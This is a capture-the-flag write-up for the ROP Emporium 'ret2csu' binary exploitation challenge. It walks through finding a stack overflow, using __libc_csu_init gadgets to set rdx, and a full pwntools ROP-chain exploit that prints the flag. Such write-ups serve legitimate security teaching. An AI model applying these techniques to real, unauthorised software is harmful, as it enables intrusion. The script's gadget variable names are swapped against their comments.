+++
tags = ["rop","ctf","linux"]
categories = ["Capture the Flag"]
date = "2021-08-12"
description = "A writeup for the binary exploitation challenge 'ret2csu' from the ROP Emporium challenge set."
featuredpath = "date"
linktitle = ""
title = "ROP Emporium :: Ret2csu"
slug = "rop-emporium-ret2csu"
type = "post"
+++

## Reverse Engineering

Let's run the `file` command to get a brief overview of the binary. Note that it is a 64-bit linux executable.

```
$ file ./ret2csu
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped
```

We can also run `checksec` against the target. This reveals a little more information, we can see that there is no stack canary, so there's no need to bypass that protection. We can also see that the NX bit is enabled, so we can't execute shellcode.

```
$ checksec ./ret2csu
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

Running the executable shows us that it at some point takes user input. This is likely where we'll be able to find some vulnerability.

```
$ ./ret2csu                   
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

> hello
Thank you!
```

After a tiny bit of reverse engineering, we see this `pwnme` function called by `main`. We can see that it allocates 0x20 bytes of memory for a buffer `buf`, before reading in 0x200 bytes from stdin and storing it in the buffer - here is our overflow. 

```c
void pwnme(void)
{
    void *buf;
    
    setvbuf(*_reloc.stdout, 0, 2, 0);
    puts(0xc88);
    puts(0xca0);
    memset(&buf, 0, 0x20);
    puts(0xca8);
    printf(0xd12);
    read(0, &buf, 0x200);
    puts(0xd15);
    return;
}
```

Further investigation reveals that there is a function called `ret2win`. Another function `usefulFunction` appears to call `ret2win` with the parameters `ret2win(0x3, 0x2, 0x1)`. We'll want to investigate this function further. 

```
0x00400510    1 6            sym.imp.ret2win
```

```
0x000000000040061b <+4>:     mov    edx,0x3
0x0000000000400620 <+9>:     mov    esi,0x2
0x0000000000400625 <+14>:    mov    edi,0x1
0x000000000040062a <+19>:    call   0x400510 <ret2win@plt>
```

Reversing the `ret2win` function reveals that it will immediately call `exit` if the correct parameters are not provided. If the correct parameters are provided, however, the binary will decrypt and print the flag stored in `encrypted_flag.dat`.

The correct parameters are as follows:
 - `$rdi = 0xdeadbeefdeadbeef`.
 - `$rsi = 0xcafebabecafebabe`.
 - `$rdx = 0xd00df00dd00df00d`.

So we have to find some way to set all of these registers to their correct values before calling the `ret2win` function in order to get the flag.

```
      0x000009ef      48b8efbeadde.  movabs rax, 0xdeadbeefdeadbeef
      0x000009f9      483945e8       cmp qword [var_18h], rax
  ┌─< 0x000009fd      0f85d7000000   jne 0xada
  │   0x00000a03      48b8bebafeca.  movabs rax, 0xcafebabecafebabe
  │   0x00000a0d      483945e0       cmp qword [var_20h], rax
 ┌──< 0x00000a11      0f85c3000000   jne 0xada
 ││   0x00000a17      48b80df00dd0.  movabs rax, 0xd00df00dd00df00d
 ││   0x00000a21      483945d8       cmp qword [var_28h], rax
┌───< 0x00000a25      0f85af000000   jne 0xada
│││   0x00000a2b      488d35ee0200.  lea rsi, [0x00000d20]
│││   0x00000a32      488d3de90200.  lea rdi, str.encrypted_flag.dat
│││   0x00000a39      e8f2fdffff     call sym.imp.fopen

...

│││
└└└─> 0x00000ada      488d3d930200.  lea rdi, str.Incorrect_parameters
      0x00000ae1      e8bafcffff     call sym.imp.puts           ; int puts(const char *s)
      0x00000ae6      bf01000000     mov edi, 1                  ; int status
      0x00000aeb      e850fdffff     call sym.imp.exit           ; void exit(int status)
```


## Information Gathering

First, let's find the offset of the return address from where our input buffer is stored in the `pwnme` function.

We'll use a small script to attach the process to GDB and store a cyclic pattern of bytes in our input buffer. This will allow us to calculate the offset from the start of our input buffer to the return address.

```py
#!/usr/bin/env python3

from pwn import *

r = process('./ret2csu')
gdb.attach(r)

r.clean()
r.writeline(cyclic(200))

r.interactive()
```

We can continue within GDB, and print the value at the top of the stack to get the value stored in the return pointer.

```
pwndbg> x/gx $rsp
0x7ffe9d7c4538: 0x6161616161616166
```

Using pwntools' `cyclic_find` function we can get the offset from the start of our input buffer to the return address stored on the stack.

```py
In [2]: cyclic_find(0x6161616161616166, n=8)
Out[2]: 40
```

Next let's figure out how we can store a value in the `$rdx` register. We're able to store values in the `$rdi` and `$rsi` registers quite easily (they have `pop; ret` gadgets we can easily use).

After digging around the `__libc_csu_init` function, we find two interesting looking gadgets, see below (I've added some comments for clarity).

Note that we can use the first gadget to set the values of `$rsi` and `$rdx`.

```
0x00400680      4c89fa         mov rdx, r15
0x00400683      4c89f6         mov rsi, r14
0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
0x00400691      4839dd         cmp rbp, rbx
0x00400694      75ea           jne 0x400680
```

```
0x0040069a      5b             pop rbx ; set to 0
0x0040069b      5d             pop rbp ; set to 1 to bypass check after call
0x0040069c      415c           pop r12 ; set to pointer to useless function
0x0040069e      415d           pop r13
0x004006a0      415e           pop r14 ; set to 0xcafebabecafebabe to store in $rsi
0x004006a2      415f           pop r15 ; set to 0xd00df00dd00df00d to store in $rdx
0x004006a4      c3             ret
```

It'll be a little complex, but we should be able to use these to get the values we want into our target registers.

We can use the second gadget to set up for the first gadget (so we can move the correct values into our target registers). 

Note the `call qword [r12 + rbx*8]` instruction. As it dereferences a pointer to a function, we can't use this to redirect execution.

```
0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
```

Instead we'll have to find a pointer to some function that doesn't change anything, as to not ruin the values stored in our target registers. We'll just pass by this call and head to the `ret` instruction below.

Let's take a look at the functions stored in the binary, and see if we can find any pointers to them.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  ret2win@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
```

Using `objdump` and `grep` we can look for the first couple bytes of each function, and see if they show up anywhere in the disassembly.

The address that immediately jumps out to me is `0x4003af`, which contains the bytes for the `_fini` function, a suitably inert function.

```
$ objdump -D ret2csu | grep '06 40' -B 1
  4003ad:       00 0e                   add    %cl,(%rsi)
  4003af:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
--
  40052e:       54                      push   %rsp
  40052f:       49 c7 c0 b0 06 40 00    mov    $0x4006b0,%r8
  400536:       48 c7 c1 40 06 40 00    mov    $0x400640,%rcx
  40053d:       48 c7 c7 07 06 40 00    mov    $0x400607,%rdi
--
  600e45:       00 00                   add    %al,(%rax)
  600e47:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
```

We can look this up in GDB to be sure (adding 1 to align the address correctly).

```
pwndbg> x/x (0x4003af + 1)
0x4003b0:       0x00000000004006b4
```

Now we can use the `ropper` tool to find a gadget to set the value of `$rdi`. Surprise, surprise, we immediately find one. 

```
$ ropper --file ./ret2csu --search '% rdi' 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % rdi

[INFO] File: ./ret2csu
0x00000000004006a3: pop rdi; ret;
```


## Exploit Development

We have all the information we need, so let's start building our exploit. Here's an outline of what we want to achieve:
 - Overwrite the return address in the `pwnme` function.
 - Store the values `0xcafebabecafebabe` and `0xd00df00dd00df00d` in the `$rsi` and `$rdx` registers.
 - Store the value `0xdeadbeefdeadbeef` in the `$rdi` register.
 - Call the `ret2win` function with the above values.

Note: we have to be pretty careful when using the gadgets we found in the csu function, in order to pass the check after the call, we have to set the values `$rbp = 1` and `$rbx = 0`.

We also have to pad out the stack so that the `pop` instructions after the call don't destroy our rop chain.

```py
#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'


'''
pop rbx     ; 0
pop rbp     ; 1
pop r12     ; 0x4003af+1
pop r13
pop r14     ; 0xcafebabecafebabe
pop r15     ; 0xd00df00dd00df00d
ret         ; ret2csu_rdx
'''
ret2csu_set = 0x00400680

'''
mov rdx, r15
mov rsi, r14
mov edi, r13d
call qword [r12 + rbx*8]
'''
ret2csu_rdx = 0x0040069a

'''
pop rdi     ; 0xdeadbeefdeadbeef
ret         ; ret2win
'''
pop_rdi = 0x004006a3

'''
jmp qword [reloc.ret2win]
'''
ret2win = 0x00400510 


elf = ELF('./ret2csu')
rop = ROP(elf)

# ret2csu_set
rop.raw(ret2csu_rdx)
rop.raw(0)                  # pop rbx
rop.raw(1)                  # pop rbp
rop.raw(0x4003af+1)         # pop r12
rop.raw(0)                  # pop r13
rop.raw(0xcafebabecafebabe) # pop r14
rop.raw(0xd00df00dd00df00d) # pop r15

# ret2csu_rdx
rop.raw(ret2csu_set)

# pop_rdi
rop.raw(0)                  # stack alignment
rop.raw(0)                  # pop rbx
rop.raw(0)                  # pop rbp
rop.raw(0)                  # pop r12
rop.raw(0)                  # pop r13
rop.raw(0)                  # pop r14
rop.raw(0)                  # pop r15
rop.raw(pop_rdi)
rop.raw(0xdeadbeefdeadbeef) # pop rdi

# ret2win
rop.raw(ret2win)

r = process('./ret2csu')

r.clean()
r.writeline(b'A'*40 + rop.chain())

r.readline()
log.success('Flag: ' + r.readline().decode('utf-8'))
```

And finally, here's our exploit in action.

```
./exploit.py 
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './ret2csu'
[+] Starting local process './ret2csu': pid 1110
[+] Flag: ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2csu' stopped with exit code 0 (pid 1110)
```

